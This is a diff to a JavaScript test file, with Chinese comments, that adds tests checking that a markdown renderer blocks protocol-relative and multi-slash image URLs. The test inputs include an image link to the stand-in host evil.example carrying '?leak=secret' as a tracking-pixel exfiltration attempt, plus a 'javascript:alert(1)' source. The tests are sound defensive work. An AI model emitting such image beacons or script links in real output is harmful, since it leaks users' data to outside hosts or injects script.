@@ -39,6 +39,17 @@ describe('S3 图片白名单限同源（拍板 2026-11-21）', () => {
     expect(html).toContain('noopener');
   });
 
+  it('协议相对 //evil.com 拒绝（评审 blocker：两字符绕穿信标通道）', () => {
+    const html = renderMarkdownSafe('![x](//evil.example/pixel.gif?leak=secret)');
+    expect(html).not.toContain('<img');
+    expect(html).not.toContain('src="//evil.example');
+  });
+
+  it('///evil 多斜杠同拒', () => {
+    const html = renderMarkdownSafe('![x](///evil.example/p)');
+    expect(html).not.toContain('<img');
+  });
+
   it('javascript: src 被 markdown-it validateLink 拦为纯文本（不产 img/注入 href）', () => {
     const html = renderMarkdownSafe('![x](javascript:alert(1))');
     expect(html).not.toContain('<img');
